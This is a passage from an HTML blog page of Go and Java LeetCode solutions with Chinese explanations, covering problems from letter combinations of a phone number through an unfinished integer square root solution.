Combinations of a Phone Number"></a>17. <a href="https://leetcode.com/problems/letter-combinations-of-a-phone-number/description/">Letter Combinations of a Phone Number</a></h3><pre><code class="go">var chars = [][]byte&#123;    &#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;&#125;,       // 2    &#123;&#39;d&#39;, &#39;e&#39;, &#39;f&#39;&#125;,       // 3    &#123;&#39;g&#39;, &#39;h&#39;, &#39;i&#39;&#125;,       // 4    &#123;&#39;j&#39;, &#39;k&#39;, &#39;l&#39;&#125;,       // 5    &#123;&#39;m&#39;, &#39;n&#39;, &#39;o&#39;&#125;,       // 6    &#123;&#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;&#125;, // 7    &#123;&#39;t&#39;, &#39;u&#39;, &#39;v&#39;&#125;,      // 8    &#123;&#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;&#125;, // 9&#125;var result []stringfunc letterCombinations(digits string) []string &#123;    // 边界判断    if len(digits) == 0 &#123;        return []string&#123;&#125;    &#125;    // 清空全局变量，防止下一示例直接使用了该变量    result = []string&#123;&#125;    dfs(digits, 0, &quot;&quot;)    return result&#125;func dfs(digits string, level int, str string) &#123;    // 递归出口    if level == len(digits) &#123;        result = append(result, str)        return    &#125;    // 将输入的单个digit转换为数字    digit, _ := strconv.Atoi(string(digits[level]))    // 在单个键位的字符中循环    for i := 0; i &lt; len(chars[digit-2]); i++ &#123;        // 下一层递归        dfs(digits, level+1, str+string(chars[digit-2][i]))    &#125;&#125;</code></pre><h3 id="19-Remove-Nth-Node-From-End-of-List"><a href="#19-Remove-Nth-Node-From-End-of-List" class="headerlink" title="19. Remove Nth Node From End of List"></a>19. <a href="https://leetcode.com/problems/remove-nth-node-from-end-of-list/">Remove Nth Node From End of List</a></h3><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li><strong>双指针</strong>，第一个指针一直往下走，并将倒数的数值<code>n</code>减一，直到<code>n==0</code>第二个指针再走，其中用<code>pre</code>指针记录第二个指针的原位置。第一个指针到底（为<code>nil</code>）时则返回。</li></ul><h4 id="Solutions-1"><a href="#Solutions-1" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>双指针</p><pre><code class="go">func removeNthFromEnd(head *ListNode, n int) *ListNode &#123;    pre, p1, p2 := head, head, head        // pre记录前置节点    for p2 != nil &#123;        if n == 0 &#123;            pre = p1            p1 = p1.Next        &#125; else &#123;            n--        &#125;        p2 = p2.Next    &#125;    // 判断是否删除的是链表头节点，若是直接返回下一节点    if pre == p1 &#123;        return pre.Next    &#125;    // 删除pre节点后一节点（即p1s）    pre.Next = p1.Next    return head&#125;</code></pre></li><li><p>双指针（改良）</p><pre><code class="go">func removeNthFromEnd(head *ListNode, n int) *ListNode &#123;    dummy := new(ListNode) // 在 head 前防止虚拟节点，解决删除的是第一个元素的问题    dummy.Next = head    p := head    // p 是用于探底的指针    head = dummy    // p 先走    for n &gt; 0 &#123;        p = p.Next        n--    &#125;    // dummy 跟着往后走，直到 p 到底    for p != nil &#123;        dummy = dummy.Next        p = p.Next    &#125;    // 删除结点    dummy.Next = dummy.Next.Next    return head.Next&#125;</code></pre></li></ul><h3 id="20-Valid-Parentheses"><a href="#20-Valid-Parentheses" class="headerlink" title="20. Valid Parentheses"></a><a href="https://leetcode.com/problems/valid-parentheses/description/">20. Valid Parentheses</a></h3><h4 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h4><p>循环将字符串里的<code>&#39;&#123;&#125;()[]&#39;</code>替换为空字符串，最终得到空字符串即为匹配。该解法实际效率较低。</p><pre><code class="go">func isValid(s string) bool &#123;    for strings.Contains(s, &quot;[]&quot;) || strings.Contains(s, &quot;&#123;&#125;&quot;) || strings.Contains(s, &quot;()&quot;) &#123;        s = strings.Replace(s, &quot;[]&quot;, &quot;&quot;, -1)        s = strings.Replace(s, &quot;&#123;&#125;&quot;, &quot;&quot;, -1)        s = strings.Replace(s, &quot;()&quot;, &quot;&quot;, -1)    &#125;    if s == &quot;&quot; &#123;        return true    &#125;    return false&#125;</code></pre><h4 id="栈匹配"><a href="#栈匹配" class="headerlink" title="栈匹配"></a>栈匹配</h4><p>对于括号匹配问题常见的解法是使用栈匹配。</p><pre><code class="go">func isValid(s string) bool &#123;    stack := make([]byte, 0)    length := 0    // 记录栈顶    for _, v := range []byte(s) &#123;        stack = append(stack, v)        length++        for length &gt; 1 &#123;            left := stack[length-2]        // 栈末尾倒数第二个            right := stack[length-1]    // 栈末尾倒数第一个            if (left == &#39;(&#39; &amp;&amp; right == &#39;)&#39;) || (left == &#39;&#123;&#39; &amp;&amp; right == &#39;&#125;&#39;) || (left == &#39;[&#39; &amp;&amp; right == &#39;]&#39;) &#123;                length -= 2                stack = stack[:length]                continue            &#125;            break        &#125;    &#125;    return len(stack) == 0&#125;</code></pre><h3 id="21-Merge-Two-Sorted-Lists"><a href="#21-Merge-Two-Sorted-Lists" class="headerlink" title="21. Merge Two Sorted Lists"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. Merge Two Sorted Lists</a></h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><pre><code class="go">func mergeTwoLists(l1 *ListNode, l2 *ListNode) *ListNode &#123;    if l1 == nil &#123;        return l2    &#125;    if l2 == nil &#123;        return l1    &#125;    if l1.Val &lt; l2.Val &#123;        l1.Next = mergeTwoLists(l1.Next, l2)        return l1    &#125; else &#123;        l2.Next = mergeTwoLists(l1, l2.Next)        return l2    &#125;&#125;</code></pre><h4 id="去重"><a href="#去重" class="headerlink" title="去重*"></a>去重*</h4><pre><code class="go">func mergeTwoLists(l1 *ListNode, l2 *ListNode) *ListNode &#123;    if l1 == nil &#123;        return l2    &#125;    if l2 == nil &#123;        return l1    &#125;    if l1.Val &lt; l2.Val &#123;        l1.Next = mergeTwoLists(l1.Next, l2)        return l1    &#125; else if l1.Val &gt; l2.Val &#123;        l2.Next = mergeTwoLists(l1, l2.Next)        return l2    &#125; else &#123;        l1.Next = mergeTwoLists(l1.Next, l2.Next)        return l1    &#125;&#125;</code></pre><h3 id="22-Generate-Parentheses"><a href="#22-Generate-Parentheses" class="headerlink" title="22. Generate Parentheses"></a><a href="https://leetcode-cn.com/problems/generate-parentheses/">22. Generate Parentheses</a></h3><p>使用回溯，左右括号各 <code>n</code> 个，用完即可。</p><pre><code class="go">func generateParenthesis(n int) []string &#123;    res := make([]string, 0)    dfs(n, n, &quot;&quot;, &amp;res)    return res&#125;func dfs(left, right int, tmp string, res *[]string) &#123;    if left == 0 &amp;&amp; right == 0 &#123;        // 当括号用完，返回        *res = append(*res, tmp)        return    &#125;    if left == right &#123;        // 左右括号数量相等，只能用左括号        dfs(left-1, right, tmp + &quot;(&quot;, res)    &#125; else if left &lt; right &#123;        // 左括号数量小于右括号，左右括号都可以用        if left &gt; 0 &#123;            dfs(left-1, right, tmp + &quot;(&quot;, res)        &#125;        dfs(left, right-1, tmp + &quot;)&quot;, res)    &#125;    // 左括号数量大于右括号，无法再闭合，不可能生成有效的字符串，则丢弃&#125;</code></pre><p>由于函数最初已经判断过了，因此 <code>left == right</code> 语句中，两个变量不可能同为 <code>0</code> ，简化上面的代码控制流如下：</p><pre><code class="go">func generateParenthesis(n int) []string &#123;    res := make([]string, 0)    dfs(n, n, &quot;&quot;, &amp;res)    return res&#125;func dfs(left, right int, tmp string, res *[]string) &#123;    if left == 0 &amp;&amp; right == 0 &#123;        *res = append(*res, tmp)        return    &#125;    if left &gt; 0 &#123;        dfs(left-1, right, tmp + &quot;(&quot;, res)    &#125;    if left &lt; right &#123;        dfs(left, right-1, tmp + &quot;)&quot;, res)    &#125;&#125;</code></pre><h3 id="26-Remove-Duplicates-from-Sorted-Array"><a href="#26-Remove-Duplicates-from-Sorted-Array" class="headerlink" title="26. Remove Duplicates from Sorted Array"></a><a href="https://leetcode.com/problems/remove-duplicates-from-sorted-array/">26. Remove Duplicates from Sorted Array</a></h3><h4 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h4><ol><li><p>left 移动条件：left 为 0 或 left 元素和 left-1 的元素不相等</p></li><li><p>right 移动条件：right 和 left 不等（相等则用 right 覆盖 left）</p></li></ol><pre><code class="go">func removeDuplicates(nums []int) int &#123;    left, right := 0, 1    for right &lt;= len(nums) &#123;        // left 左移条件        if left == 0 || nums[left-1] != nums[left] &#123;            left++        &#125;        // right 越界跳出（此时 left 左移条件已经执行了）        if right == len(nums) &#123;            break        &#125;        // right 右移条件        if nums[left] == nums[right] &#123;            right++        &#125; else &#123;            nums[left] = nums[right]        &#125;    &#125;    return left&#125;</code></pre><h3 id="27-Remove-Element"><a href="#27-Remove-Element" class="headerlink" title="27. Remove Element"></a><a href="https://leetcode.com/problems/remove-element/">27. Remove Element</a></h3><h4 id="双指针-1"><a href="#双指针-1" class="headerlink" title="双指针"></a>双指针</h4><p>双指针，左指针一步步走，右指针遇到目标数就跳过数字并跳到下一循环。简单来说就是把除了等于目标数的元素都覆盖到前面去</p><pre><code class="go">func removeElement(nums []int, val int) int &#123;    left, right := 0, 0    for right &lt; len(nums) &#123;        // 跳过        if nums[right] == val &#123;            right++            continue        &#125;        nums[left] = nums[right]        left++        right++    &#125;    return left&#125;</code></pre><h3 id="31-Next-Permutation"><a href="#31-Next-Permutation" class="headerlink" title="31. Next Permutation"></a>31. <a href="https://leetcode.com/problems/next-permutation/">Next Permutation</a></h3><h4 id="Ideas-2"><a href="#Ideas-2" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>双指针<br>首先要找到左指针元素比其后一个元素小的位置作为 left，在 left 左侧的元素都不需要变动，其后的值必定是递减的，在这后面的值里找一个大于 left 的最小值，二者交换值，最终再将 left 之后的元素按递增排序</li></ul><h4 id="Solutions-2"><a href="#Solutions-2" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>双指针</p><pre><code class="go">func nextPermutation(nums []int)  &#123;    left, right := len(nums)-2, len(nums)-1    // 固定left位置    for left &gt;=0 &amp;&amp; nums[left] &gt;= nums[left+1] &#123;        left--    &#125;    if left &gt;= 0 &#123;        // 查找left右侧大于left的最小值        for right &gt;=0 &amp;&amp; nums[left] &gt;= nums[right] &#123;            right--        &#125;        // 交换        nums[left], nums[right] = nums[right], nums[left]    &#125;    // 翻转    reverse(nums[left+1:])&#125;func reverse(nums []int) &#123;    for i, n := 0, len(nums)-1; i &lt;= n/2 ; i++ &#123;        nums[i], nums[n-i] = nums[n-i], nums[i]    &#125;&#125;</code></pre></li></ul><h3 id="33-Search-in-Rotated-Sorted-Array"><a href="#33-Search-in-Rotated-Sorted-Array" class="headerlink" title="33. Search in Rotated Sorted Array"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">33. Search in Rotated Sorted Array</a></h3><p>旋转排序数组，仍然按照二分法，分别对左有序和右有序的情况作判断。</p><h4 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h4><pre><code class="go">func search(nums []int, target int) int &#123;    low, high := 0, len(nums) - 1    for low &lt;= high &#123;        mid := (low + high) &gt;&gt; 1        if nums[mid] == target &#123;            return mid        &#125;        if nums[mid] &gt;= nums[low] &#123;            // left ordered            if target &lt; nums[mid] &amp;&amp; target &gt;= nums[low] &#123;                // 说明 target 只能在左侧                high = mid - 1            &#125; else &#123;                // target 可能在右侧（比左侧最小的还要小或是比左侧最大的还要大）                low = mid + 1            &#125;        &#125; else &#123;            // right ordered            if target &gt; nums[mid] &amp;&amp; target &lt;= nums[high] &#123;                low = mid + 1            &#125; else &#123;                high = mid - 1            &#125;        &#125;    &#125;    return -1&#125;</code></pre><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><pre><code class="java">class Solution &#123;    public int search(int[] nums, int target) &#123;        int low = 0, high = nums.length - 1, mid = 0;        while (low &lt;= high) &#123;            mid = (low + high) &gt;&gt; 1;            if(nums[mid] == target) &#123;                return mid;            &#125;            if (nums[mid] &gt;= nums[low]) &#123;                // left ordered                if (target &lt; nums[mid] &amp;&amp; target &gt;= nums[low]) &#123;                    high = mid - 1;                &#125; else &#123;                    low = mid + 1;                &#125;            &#125; else &#123;                // right ordered                if (target &gt; nums[mid] &amp;&amp; target &lt;= nums[high]) &#123;                    low = mid + 1;                &#125; else &#123;                    high = mid - 1;                &#125;            &#125;        &#125;        return -1;    &#125;&#125;</code></pre><h3 id="34-Find-First-and-Last-Position-of-Element-in-Sorted-Array"><a href="#34-Find-First-and-Last-Position-of-Element-in-Sorted-Array" class="headerlink" title="34. Find First and Last Position of Element in Sorted Array"></a><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">34. Find First and Last Position of Element in Sorted Array</a></h3><p>简单两次二分查找即可。</p><ul><li>时间复杂度：$O(log{n})$</li><li>空间复杂度：$O(1)$</li></ul><h4 id="Go-1"><a href="#Go-1" class="headerlink" title="Go"></a>Go</h4><pre><code class="go">func searchRange(nums []int, target int) []int &#123;    res := []int&#123;-1, -1&#125;    // 返回值    left, right := 0, len(nums) - 1    if right &lt; left &#123;        // nums 为空        return res    &#125;    // 找左边界    for left &lt; right &#123;        mid := (left + right) &gt;&gt; 1        if nums[mid] &gt;= target &#123;            right = mid        &#125; else &#123;            left = mid + 1        &#125;    &#125;    if nums[left] != target &#123;        // 数组中不存在        return res    &#125;    res[0] = left    right = len(nums)    // 复位 right    for left &lt; right &#123;        mid := (left + right) &gt;&gt; 1        if nums[mid] &lt;= target &#123;            left = mid + 1        &#125; else &#123;            right = mid        &#125;    &#125;    res[1] = right - 1    return res&#125;</code></pre><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><pre><code class="java">class Solution &#123;    public int[] searchRange(int[] nums, int target) &#123;        int low = 0, high = nums.length - 1, mid = 0;        int res[] = &#123;-1, -1&#125;;        if (nums.length == 0) &#123;            return res;        &#125;        while(low &lt; high) &#123;            mid = (low + high) / 2;            if (nums[mid] &gt;= target) &#123;                high = mid;            &#125; else &#123;                low = mid + 1;            &#125;        &#125;        if (nums[low] != target) &#123;            return res;        &#125;        res[0] = low;        high = nums.length;        while(low &lt; high) &#123;            mid = (low + high) / 2;            if (nums[mid] &lt;= target) &#123;                low = mid + 1;            &#125; else &#123;                high = mid;            &#125;        &#125;        res[1] = high - 1;        return res;    &#125;&#125;</code></pre><h3 id="39-Combination-Sum"><a href="#39-Combination-Sum" class="headerlink" title="39. Combination Sum"></a>39. <a href="https://leetcode.com/problems/combination-sum/">Combination Sum</a></h3><h4 id="Ideas-3"><a href="#Ideas-3" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>回溯法</li></ul><h4 id="Solutions-3"><a href="#Solutions-3" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>回溯</p><pre><code class="go">func combinationSum(candidates []int, target int) [][]int &#123;    res := make([][]int, 0)    tmp := make([]int, 0)    backtracking(candidates, target, 0, &amp;res, &amp;tmp)    return res&#125;func backtracking(candidates []int, target, index int, res *[][]int, tmp *[]int) &#123;    if target &lt;= 0 &#123;        if target == 0 &#123;            dst := make([]int, len(*tmp))            copy(dst, *tmp)            *res = append(*res, dst)        &#125;        return    &#125;    for i := index; i &lt; len(candidates); i++ &#123;        target -= candidates[i]        *tmp = append(*tmp, candidates[i])        backtracking(candidates, target, i, res, tmp)        *tmp = (*tmp)[:len(*tmp)-1]        target += candidates[i]    &#125;&#125;</code></pre></li></ul><h3 id="45-Jump-Game-II"><a href="#45-Jump-Game-II" class="headerlink" title="45. Jump Game II"></a><a href="https://leetcode.com/problems/jump-game-ii/">45. Jump Game II</a></h3><h4 id="Ideas-4"><a href="#Ideas-4" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>贪心策略，从后找最靠左的能找到自己的位置，从该位置重复上述操作，直到数组开头。</li></ul><h4 id="Solutions-4"><a href="#Solutions-4" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>贪心</p><pre><code class="go">func jump(nums []int) int &#123;    length := len(nums)    if length == 1 &#123;        return 0    &#125;    count := 0    for i := length-1; i &gt; 0; i-- &#123;        for j := 0; j &lt; i; j++ &#123;            if nums[j] &gt;= i-j &#123;                i = j+1                break            &#125;        &#125;        count++    &#125;    return count&#125;</code></pre></li><li><p>?</p><pre><code class="go">func jump(nums []int) int &#123;    curJump, farthestJump, jumps := 0, 0, 0    for i := 0; i &lt; len(nums)-1; i++ &#123;        // push index of furthest jump during current iteration        if i+nums[i] &gt; farthestJump &#123;            farthestJump = i + nums[i]        &#125;        // if current iteration is ended - setup the next one        if i == curJump &#123;            jumps, curJump = jumps+1, farthestJump            if curJump &gt;= len(nums)-1 &#123;                return jumps            &#125;        &#125;    &#125;    // it&#39;s guaranteed to never hit it    return 0&#125;</code></pre></li></ul><h3 id="46-Permutations"><a href="#46-Permutations" class="headerlink" title="46. Permutations"></a>46. <a href="https://leetcode.com/problems/permutations/">Permutations</a></h3><h4 id="Ideas-5"><a href="#Ideas-5" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>典型回溯</li></ul><h4 id="Solutions-5"><a href="#Solutions-5" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>回溯</p><pre><code class="go">func permute(nums []int) [][]int &#123;    res := make([][]int, 0)    tmp := make([]int, 0)    visited := make([]bool, len(nums))    backtracking(nums, &amp;res, &amp;tmp, &amp;visited)    return res&#125;func backtracking(nums []int, res *[][]int, tmp *[]int, visited *[]bool) &#123;    if len(nums) == 0 &#123;        return    &#125;    if len(*tmp) == len(nums) &#123;        dst := make([]int, len(*tmp))        copy(dst, *tmp)        *res = append(*res, dst)        return    &#125;    for i := 0; i &lt; len(nums); i++ &#123;        if (*visited)[i] &#123;            continue        &#125;        *tmp = append(*tmp, nums[i])        (*visited)[i] = true        backtracking(nums, res, tmp, visited)        (*visited)[i] = false        *tmp = (*tmp)[:len(*tmp)-1]    &#125;&#125;</code></pre></li></ul><h3 id="47-Permutations-II"><a href="#47-Permutations-II" class="headerlink" title="47. Permutations II"></a>47. <a href="https://leetcode.com/problems/permutations-ii/">Permutations II</a></h3><h4 id="Ideas-6"><a href="#Ideas-6" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>回溯，相较于 46 题，需要跳过重复元素，因此首先要判断元素是否已经存在。</li></ul><h4 id="Solutions-6"><a href="#Solutions-6" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>回溯</p><pre><code class="go">func permuteUnique(nums []int) [][]int &#123;    sort.Ints(nums)    res := make([][]int, 0)    tmp := make([]int, 0)    visited := make([]bool, len(nums))    backtracking(nums, &amp;res, &amp;tmp, &amp;visited)    return res&#125;func backtracking(nums []int, res *[][]int, tmp *[]int, visited *[]bool) &#123;    if len(nums) == 0 &#123;        return    &#125;    if len(*tmp) == len(nums) &#123;        dst := make([]int, len(*tmp))        copy(dst, *tmp)        *res = append(*res, dst)        return    &#125;    for k, v := range nums &#123;        // 当左相邻元素和当前元素相等且未访问过时跳出        if (*visited)[k] || k &gt; 0 &amp;&amp; !(*visited)[k-1] &amp;&amp; v == nums[k-1] &#123;            continue        &#125;        *tmp = append(*tmp, nums[k])        (*visited)[k] = true        backtracking(nums, res, tmp, visited)        (*visited)[k] = false        *tmp = (*tmp)[:len(*tmp)-1]    &#125;&#125;</code></pre></li></ul><h3 id="48-Rotate-Image"><a href="#48-Rotate-Image" class="headerlink" title="48. Rotate Image"></a><a href="https://leetcode-cn.com/problems/rotate-image/">48. Rotate Image</a></h3><p>先斜对角翻转，再横向翻转。</p><p>如：[[1,2,3],[4,5,6],[7,8,9]] =&gt; [[1,4,7],[2,5,8],[3,6,9]] =&gt; [[7,4,1],[8,5,2],[9,6,3]]</p><pre><code class="go">func rotate(matrix [][]int)  &#123;    for i := 1; i &lt; len(matrix); i++ &#123;        for j := 0; j &lt; i; j++ &#123;            matrix[i][j], matrix[j][i] = matrix[j][i], matrix[i][j]        &#125;    &#125;    for k := 0; k &lt; len(matrix); k++ &#123;        for i, j := 0, len(matrix[0])-1; i &lt; j; i, j = i+1, j-1 &#123;            matrix[k][i], matrix[k][j] = matrix[k][j], matrix[k][i]        &#125;    &#125;&#125;</code></pre><h3 id="49-Group-Anagrams"><a href="#49-Group-Anagrams" class="headerlink" title="49. Group Anagrams"></a><a href="https://leetcode-cn.com/problems/group-anagrams/">49. Group Anagrams</a></h3><h4 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h4><p>将字符串排序后的字符串作为键放入哈希表中，值为一个字符串数组。最后遍历哈希表输出即可。</p><pre><code class="go">func groupAnagrams(strs []string) [][]string &#123;    m := make(map[string][]string)    for _, v := range strs &#123;        bt := []byte(v)    // 字符串转换为 byte 数组        // 排序        sort.Slice(bt, func(a, b int) bool &#123;            return bt[a] &lt; bt[b]        &#125;)        str := string(bt)        m[str] = append(m[str], v)    &#125;    res := make([][]string, 0)    for _, v := range m &#123;        res = append(res, v)    &#125;    return res&#125;</code></pre><h3 id="54-Spiral-Matrix"><a href="#54-Spiral-Matrix" class="headerlink" title="54. Spiral Matrix"></a><a href="https://leetcode-cn.com/problems/spiral-matrix/">54. Spiral Matrix</a></h3><h4 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h4><pre><code class="go">func spiralOrder(matrix [][]int) []int &#123;    if len(matrix) == 0 &#123;        return nil    &#125;    rowMin, colMin := 0, 0    rowMax, colMax := len(matrix), len(matrix[0])    res := make([]int, rowMax * colMax)    index := 0    for &#123;        // left -&gt; right        for i := colMin; i &lt; colMax; i++ &#123;            res[index] = matrix[rowMin][i]            index++        &#125;        rowMin++        if rowMin &gt;= rowMax &#123;            break        &#125;        // top -&gt; down        for i := rowMin; i &lt; rowMax; i++ &#123;            res[index] = matrix[i][colMax-1]            index++        &#125;        colMax--        if colMin &gt;= colMax &#123;            break        &#125;        // right -&gt; left        for i := colMax-1; i &gt;= colMin; i-- &#123;            res[index] = matrix[rowMax-1][i]            index++        &#125;        rowMax--        if rowMin &gt;= rowMax &#123;            break        &#125;        // down -&gt; top        for i := rowMax-1; i &gt;= rowMin; i-- &#123;            res[index] = matrix[i][colMin]            index++        &#125;        colMin++        if colMin &gt;= colMax &#123;            break        &#125;    &#125;    return res&#125;</code></pre><h3 id="53-Maximum-Subarray"><a href="#53-Maximum-Subarray" class="headerlink" title="53. Maximum Subarray"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/">53. Maximum Subarray</a></h3><h4 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h4><p>原地修改。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func maxSubArray(nums []int) int &#123;    maxNum := nums[0]    sum := 0    for i := 1; i &lt; len(nums); i++ &#123;        if sum = nums[i]+nums[i-1]; sum &gt; nums[i] &#123;            nums[i] = sum        &#125;        if nums[i] &gt; maxNum &#123;            maxNum = nums[i]        &#125;    &#125;    return maxNum&#125;</code></pre><h4 id="分治"><a href="#分治" class="headerlink" title="分治"></a>分治</h4><h3 id="55-Jump-Game"><a href="#55-Jump-Game" class="headerlink" title="55. Jump Game"></a>55. <a href="https://leetcode.com/problems/jump-game/">Jump Game</a></h3><h4 id="Ideas-7"><a href="#Ideas-7" class="headerlink" title="Ideas"></a>Ideas</h4><h4 id="Solutions-7"><a href="#Solutions-7" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>?</p><pre><code class="go">func canJump(nums []int) bool &#123;    if len(nums) == 1 &#123;        return true    &#125;    cur, further, jumps := 0, 0, 0    for i := 0; i &lt; len(nums)-1; i++ &#123;        if i+nums[i] &gt; further &#123;            further = i+nums[i]        &#125;        if i == cur &#123;            jumps++            cur = further            if cur &gt;= len(nums)-1 &#123;                return true            &#125;        &#125;    &#125;    return false&#125;</code></pre></li></ul><h3 id="56-Merge-Intervals"><a href="#56-Merge-Intervals" class="headerlink" title="56. Merge Intervals"></a><a href="https://leetcode-cn.com/problems/merge-intervals/">56. Merge Intervals</a></h3><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>将数组按第一个值排序，遍历数组列表，当后一个数组第一个值不大于前一个数组第二个值，且后一个数组第二个值大于前一个数组第二个值时，更新前一个数组在结果列表里的数据。</p><pre><code class="go">func merge(intervals [][]int) [][]int &#123;    // 排序列表    sort.Slice(intervals, func(a, b int) bool &#123;        return intervals[a][0] &lt; intervals[b][0]    &#125;)    res := [][]int&#123;intervals[0]&#125;    // 结果列表，已经插入了第一对数字    for i := 1; i &lt; len(intervals); i++ &#123;        if num := res[len(res)-1][1]; num &gt;= intervals[i][0] &#123;            if num &lt;= intervals[i][1] &#123;                res[len(res)-1][1] = intervals[i][1]            &#125;        &#125; else &#123;            res = append(res, intervals[i])        &#125;    &#125;    return res&#125;</code></pre><h3 id="58-Length-of-Last-Word"><a href="#58-Length-of-Last-Word" class="headerlink" title="58. Length of Last Word"></a><a href="https://leetcode-cn.com/problems/length-of-last-word/">58. Length of Last Word</a></h3><h4 id="双指针-2"><a href="#双指针-2" class="headerlink" title="双指针"></a>双指针</h4><p>从后向前遍历，分别记录第一个非空格字符和第二个空格字符串的位置。</p><pre><code class="go">func lengthOfLastWord(s string) int &#123;    left, right := len(s)-1, len(s)-1    for i := len(s)-1; i &gt;= 0; i-- &#123;        if left == right &amp;&amp; s[i] == &#39; &#39; &#123;            right--        &#125; else if s[i] == &#39; &#39; &#123;            break        &#125;        left--    &#125;    return right - left&#125;</code></pre><h3 id="61-Rotate-List"><a href="#61-Rotate-List" class="headerlink" title="61. Rotate List"></a>61. <a href="https://leetcode.com/problems/rotate-list/">Rotate List</a></h3><h4 id="Ideas-8"><a href="#Ideas-8" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>双指针解法，本题要求得到循环<code>n</code>次的链表，循环次数可能比链表本身的长度还要长，因此可以将链表串成循环链表，再将其从中间拆分<br>时间复杂度：$O(n+k)$<br>空间复杂度：$O(1)$</li></ul><h4 id="Solutions-8"><a href="#Solutions-8" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>双指针</p><pre><code class="go">func rotateRight(head *ListNode, k int) *ListNode &#123;      if head == nil &#123;        return head    &#125;    p := head    // 计算链表长度    count := 0    for &#123;        count++        if p.Next == nil &#123;            break        &#125;        p = p.Next    &#125;    // 连接链表头尾    p.Next = head    // 定位中断位置    k = count - (k%count)    for k &gt; 1 &#123;        head = head.Next        k--    &#125;    // 截断循环链表    tmp := head.Next    head.Next = nil    return tmp&#125;</code></pre></li></ul><h3 id="62-Unique-Paths"><a href="#62-Unique-Paths" class="headerlink" title="62. Unique Paths"></a><a href="https://leetcode-cn.com/problems/unique-paths/">62. Unique Paths</a></h3><h4 id="动态规划-1"><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h4><p>简单动态规划。</p><pre><code class="go">func uniquePaths(m int, n int) int &#123;    dp := make([][]int, m)    for i := range dp &#123;        dp[i] = make([]int, n)    &#125;    dp[0][0] = 1    for i := range dp &#123;        for j := range dp[i] &#123;            if i &gt; 0 &#123;                dp[i][j] += dp[i-1][j]            &#125;            if j &gt; 0 &#123;                dp[i][j] += dp[i][j-1]            &#125;        &#125;    &#125;    return dp[m-1][n-1]&#125;</code></pre><h3 id="64-Minimum-Path-Sum"><a href="#64-Minimum-Path-Sum" class="headerlink" title="64. Minimum Path Sum"></a>64. <a href="https://leetcode.com/problems/minimum-path-sum/">Minimum Path Sum</a></h3><h4 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h4><p>简单的动态规划，从判断上、左元素大小，取小值加到当前位置，可以使用原数组存结果：</p><pre><code>1    3    1    -&gt;    1    4    51   5   1    -&gt;    2    7    64    2    1   -&gt;    6    8    7</code></pre><pre><code class="go">func minPathSum(grid [][]int) int &#123;    for i := 0; i &lt; len(grid); i++ &#123;        for j := 0; j &lt; len(grid[0]); j++ &#123;            if i == 0 &amp;&amp; j &gt; 0 &#123;                // 第一行                grid[i][j] = grid[i][j-1] + grid[i][j]            &#125; else if  i &gt; 0 &amp;&amp; j == 0 &#123;                // 第一列                grid[i][j] = grid[i-1][j] + grid[i][j]            &#125; else if i &gt; 0 &#123;                grid[i][j] = min(grid[i-1][j], grid[i][j-1]) + grid[i][j]            &#125;        &#125;    &#125;    return grid[len(grid)-1][len(grid[0])-1]&#125;func min(a, b int) int &#123;    if a &lt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="66-Plus-One"><a href="#66-Plus-One" class="headerlink" title="66. Plus One"></a><a href="https://leetcode.com/problems/plus-one/description/">66. Plus One</a></h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>从数组末端开始遍历，当当前数字 +1 后大于 9 即进位，将当前数字置 0。如果当前位置为数组首端，在数组前面插入一个 1 即可。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func plusOne(digits []int) []int &#123;    for i := len(digits) - 1; i &gt;= 0; i-- &#123;        digits[i]++        if digits[i] &gt; 9 &#123;            digits[i] = 0            if i == 0 &#123;                digits = append([]int&#123;1&#125;, digits...)                break            &#125;            continue        &#125;        break    &#125;    return digits&#125;</code></pre><h3 id="69-Sqrt-x"><a href="#69-Sqrt-x" class="headerlink" title="69. Sqrt(x)"></a><a href="https://leetcode.com/problems/sqrtx/description/">69. Sqrt(x)</a></h3><h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>采用二分查找的方式，不断缩小范围。</p><pre><code class="go">func mySqrt(x int) int &#123;    low, high := 0, x    for low &lt;= high &#123;        mid := (low+high)&gt;&gt;1        if m := 